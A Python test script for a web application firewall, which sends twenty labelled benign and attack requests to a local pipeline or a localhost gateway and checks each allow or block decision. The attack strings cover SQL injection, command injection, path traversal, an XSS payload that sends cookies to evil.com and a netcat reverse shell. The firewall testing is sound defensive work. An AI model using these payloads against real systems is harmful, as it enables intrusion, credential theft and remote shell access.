#!/usr/bin/env python3
"""
COMPREHENSIVE LIVE ATTACK TEST MATRIX
Script: scripts/live_attack_tester.py

Tests the WAF across ALL HTTP Methods (GET, POST, PUT, DELETE)
and ALL major Attack Categories (SQLi, XSS, RCE, Path Traversal, Benign).

Can run in two modes:
1. PIPELINE MODE: Evaluates natively using the Python WAF modules & DistilBERT model.
2. LIVE GATEWAY MODE: Sends real HTTP network requests through the Reverse Proxy Gateway.
"""

import os
import sys
import json
import time
import urllib.request
import urllib.error
import urllib.parse

# Ensure project root is in sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from waf.pipeline import WafPipeline

# ==============================================================================
# TEST MATRIX: 20 REAL-WORLD ATTACK AND BENIGN VECTORS ACROSS ALL HTTP METHODS
# ==============================================================================
TEST_VECTORS = [
    # -------------------- GET REQUESTS --------------------
    {
        "id": "GET-01",
        "method": "GET",
        "category": "BENIGN",
        "expected": "ALLOW",
        "path": "/api/v1/products?category=electronics&page=1&limit=20",
        "headers": {"Host": "gateway.local", "User-Agent": "Mozilla/5.0", "Accept": "application/json"},
        "body": "",
        "desc": "Legitimate product catalog query with pagination"
    },
    {
        "id": "GET-02",
        "method": "GET",
        "category": "SQLI",
        "expected": "BLOCK",
        "path": "/api/v1/users?id=1%20UNION%20SELECT%20null,username,password%20FROM%20admin--",
        "headers": {"Host": "gateway.local", "User-Agent": "Mozilla/5.0"},
        "body": "",
        "desc": "Classic UNION SELECT injection to extract credentials"
    },
    {
        "id": "GET-03",
        "method": "GET",
        "category": "XSS",
        "expected": "BLOCK",
        "path": "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
        "headers": {"Host": "gateway.local", "User-Agent": "Mozilla/5.0"},
        "body": "",
        "desc": "Reflected Cross-Site Scripting via query parameter"
    },
    {
        "id": "GET-04",
        "method": "GET",
        "category": "TRAVERSAL",
        "expected": "BLOCK",
        "path": "/api/v1/files/download?file=../../../../etc/passwd",
        "headers": {"Host": "gateway.local", "User-Agent": "Mozilla/5.0"},
        "body": "",
        "desc": "Directory traversal attempting sensitive Linux file extraction"
    },
    {
        "id": "GET-05",
        "method": "GET",
        "category": "RCE",
        "expected": "BLOCK",
        "path": "/api/v1/system/ping?host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd",
        "headers": {"Host": "gateway.local", "User-Agent": "Mozilla/5.0"},
        "body": "",
        "desc": "Command injection via shell semicolon chaining"
    },

    # -------------------- POST REQUESTS --------------------
    {
        "id": "POST-01",
        "method": "POST",
        "category": "BENIGN",
        "expected": "ALLOW",
        "path": "/api/v1/orders",
        "headers": {"Host": "gateway.local", "Content-Type": "application/json"},
        "body": json.dumps({"item_id": 402, "quantity": 2, "shipping_address": "123 Technology Park, Suite 400"}),
        "desc": "Legitimate customer checkout order placement"
    },
    {
        "id": "POST-02",
        "method": "POST",
        "category": "SQLI",
        "expected": "BLOCK",
        "path": "/api/v1/auth/login",
        "headers": {"Host": "gateway.local", "Content-Type": "application/json"},
        "body": json.dumps({"username": "admin' OR 1=1--", "password": "any_password"}),
        "desc": "Authentication bypass using SQL tautology in POST body"
    },
    {
        "id": "POST-03",
        "method": "POST",
        "category": "XSS",
        "expected": "BLOCK",
        "path": "/api/v1/comments",
        "headers": {"Host": "gateway.local", "Content-Type": "application/json"},
        "body": json.dumps({"author": "attacker", "content": "<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>"}),
        "desc": "Stored XSS via event handler injection in user comment"
    },
    {
        "id": "POST-04",
        "method": "POST",
        "category": "RCE",
        "expected": "BLOCK",
        "path": "/api/v1/tools/diagnostics",
        "headers": {"Host": "gateway.local", "Content-Type": "application/x-www-form-urlencoded"},
        "body": "target=localhost&cmd=nc+-e+/bin/sh+10.0.0.1+4444",
        "desc": "Remote command execution reverse shell invocation"
    },
    {
        "id": "POST-05",
        "method": "POST",
        "category": "TRAVERSAL",
        "expected": "BLOCK",
        "path": "/api/v1/media/upload",
        "headers": {"Host": "gateway.local", "Content-Type": "application/json"},
        "body": json.dumps({"destination": "../../../var/www/html/shell.php", "data": "<?php phpinfo(); ?>"}),
        "desc": "Arbitrary file write path traversal in JSON payload"
    },

    # -------------------- PUT REQUESTS --------------------
    {
        "id": "PUT-01",
        "method": "PUT",
        "category": "BENIGN",
        "expected": "ALLOW",
        "path": "/api/v1/users/42",
        "headers": {"Host": "gateway.local", "Content-Type": "application/json"},
        "body": json.dumps({"email": "alice.security@enterprise.org", "phone": "+1-555-0199"}),
        "desc": "Legitimate user profile update"
    },
    {
        "id": "PUT-02",
        "method": "PUT",
        "category": "SQLI",
        "expected": "BLOCK",
        "path": "/api/v1/users/42",
        "headers": {"Host": "gateway.local", "Content-Type": "application/json"},
        "body": json.dumps({"role": "developer', role=(SELECT admin FROM secrets)--"}),
        "desc": "Privilege escalation via stacked SQL subquery in PUT payload"
    },
    {
        "id": "PUT-03",
        "method": "PUT",
        "category": "XSS",
        "expected": "BLOCK",
        "path": "/api/v1/users/profile",
        "headers": {"Host": "gateway.local", "Content-Type": "application/json"},
        "body": json.dumps({"avatar_url": "<svg/onload=alert('DOM_XSS')>"}),
        "desc": "SVG onload payload inside avatar profile attribute"
    },
    {
        "id": "PUT-04",
        "method": "PUT",
        "category": "RCE",
        "expected": "BLOCK",
        "path": "/api/v1/system/config",
        "headers": {"Host": "gateway.local", "Content-Type": "application/json"},
        "body": json.dumps({"dns_server": "8.8.8.8 | whoami"}),
        "desc": "OS command piping injection in configuration update"
    },
    {
        "id": "PUT-05",
        "method": "PUT",
        "category": "TRAVERSAL",
        "expected": "BLOCK",
        "path": "/api/v1/logs/export",
        "headers": {"Host": "gateway.local", "Content-Type": "application/json"},
        "body": json.dumps({"destination_file": "..\\..\\Windows\\System32\\drivers\\etc\\hosts"}),
        "desc": "Windows directory traversal path overwrite attempt"
    },

    # -------------------- DELETE REQUESTS --------------------
    {
        "id": "DELETE-01",
        "method": "DELETE",
        "category": "BENIGN",
        "expected": "ALLOW",
        "path": "/api/v1/cart/items/88",
        "headers": {"Host": "gateway.local", "Accept": "application/json"},
        "body": "",
        "desc": "Legitimate e-commerce cart item removal"
    },
    {
        "id": "DELETE-02",
        "method": "DELETE",
        "category": "SQLI",
        "expected": "BLOCK",
        "path": "/api/v1/orders/101;%20DROP%20TABLE%20audit_logs--",
        "headers": {"Host": "gateway.local"},
        "body": "",
        "desc": "Stacked SQL query injection attempting table destruction"
    },
    {
        "id": "DELETE-03",
        "method": "DELETE",
        "category": "XSS",
        "expected": "BLOCK",
        "path": "/api/v1/cart?item=5&callback=%3Cscript%3Ealert('CALLBACK')%3C/script%3E",
        "headers": {"Host": "gateway.local"},
        "body": "",
        "desc": "JSONP / callback parameter XSS injection"
    },
    {
        "id": "DELETE-04",
        "method": "DELETE",
        "category": "RCE",
        "expected": "BLOCK",
        "path": "/api/v1/cache?key=%60id%60",
        "headers": {"Host": "gateway.local"},
        "body": "",
        "desc": "Backtick subcommand execution in cache purge query parameter"
    },
    {
        "id": "DELETE-05",
        "method": "DELETE",
        "category": "TRAVERSAL",
        "expected": "BLOCK",
        "path": "/api/v1/temp/cleanup?target=../../../../boot.ini",
        "headers": {"Host": "gateway.local"},
        "body": "",
        "desc": "Path traversal targeting Windows boot configuration"
    }
]


def run_pipeline_test():
    """Runs the full test matrix through the Python WAF Pipeline."""
    print("=" * 80)
    print("APPAWARE-WAF COMPREHENSIVE ATTACK & BENIGN TEST MATRIX")
    print("Evaluating GET, POST, PUT, DELETE across SQLi, XSS, RCE, Traversal, and Benign")
    print("=" * 80)

    pipe = WafPipeline(mode="ENFORCING")
    
    passed_tests = 0
    total_tests = len(TEST_VECTORS)
    
    print(f"\n{'ID':<10} {'METHOD':<8} {'CATEGORY':<12} {'DECISION':<10} {'RISK':<8} {'MATCHED RULES':<24} {'STATUS'}")
    print("-" * 80)

    for vec in TEST_VECTORS:
        # Construct raw HTTP stream
        raw_http = f"{vec['method']} {vec['path']} HTTP/1.1\n"
        for k, v in vec['headers'].items():
            raw_http += f"{k}: {v}\n"
        if vec['body']:
            raw_http += f"\n{vec['body']}"

        event = pipe.inspect_request(raw_http)
        decision = event["decision"]
        risk = event["risk_score"]
        rule_ids = [r["rule_id"] for r in event["matched_rules"]]
        rule_str = ", ".join(rule_ids[:2]) if rule_ids else "None"

        # Check expected vs actual
        is_pass = (decision == vec["expected"])
        if is_pass:
            passed_tests += 1
            status = "[PASS]"
        else:
            status = "[FAIL]"

        print(f"{vec['id']:<10} {vec['method']:<8} {vec['category']:<12} {decision:<10} {risk:<8.2f} {rule_str:<24} {status}")

    print("\n" + "=" * 80)
    print(f"MATRIX RESULTS: {passed_tests}/{total_tests} Tests Passed ({(passed_tests/total_tests)*100:.1f}%)")
    print("=" * 80)


def run_live_gateway_test(gateway_url="http://localhost:3000"):
    """Sends real HTTP requests over the wire through the Reverse Proxy Gateway."""
    print("=" * 80)
    print(f"LIVE REVERSE PROXY GATEWAY NETWORK TEST ({gateway_url}/proxy/*)")
    print("=" * 80)

    passed = 0
    total = len(TEST_VECTORS)

    for vec in TEST_VECTORS:
        target_url = f"{gateway_url}/proxy{vec['path']}"
        data = vec['body'].encode('utf-8') if vec['body'] else None
        
        req = urllib.request.Request(
            url=target_url,
            data=data,
            headers={**vec['headers'], "Content-Type": vec['headers'].get("Content-Type", "application/json")},
            method=vec['method']
        )

        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                http_code = resp.status
                waf_decision = resp.headers.get("X-WAF-Decision", "ALLOW")
                risk = resp.headers.get("X-WAF-Risk-Score", "0.0")
        except urllib.error.HTTPError as e:
            http_code = e.code
            waf_decision = e.headers.get("X-WAF-Decision", "BLOCK")
            risk = e.headers.get("X-WAF-Risk-Score", "N/A")
        except Exception as err:
            print(f"Connection error to gateway: {err}")
            return

        expected_code = 200 if vec["expected"] == "ALLOW" else 403
        is_correct = (http_code == expected_code)
        if is_correct:
            passed += 1
            status = "[PASS]"
        else:
            status = "[FAIL]"

        print(f"[{vec['id']}] {vec['method']:<6} {vec['category']:<10} -> HTTP {http_code} (WAF: {waf_decision}, Risk: {risk}) {status}")

    print("\n" + "=" * 80)
    print(f"GATEWAY ENFORCEMENT SUMMARY: {passed}/{total} Passed ({(passed/total)*100:.1f}%)")
    print("=" * 80)


def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--gateway":
        run_live_gateway_test()
    else:
        run_pipeline_test()
        # Also attempt gateway test if running locally
        try:
            urllib.request.urlopen("http://localhost:3000/api/waf/metrics", timeout=1)
            print("\nGateway is detected running! Executing live network verification...")
            run_live_gateway_test()
        except:
            print("\n(Note: Gateway server not currently reached on port 3000. Run with --gateway when server is up.)")


if __name__ == "__main__":
    main()
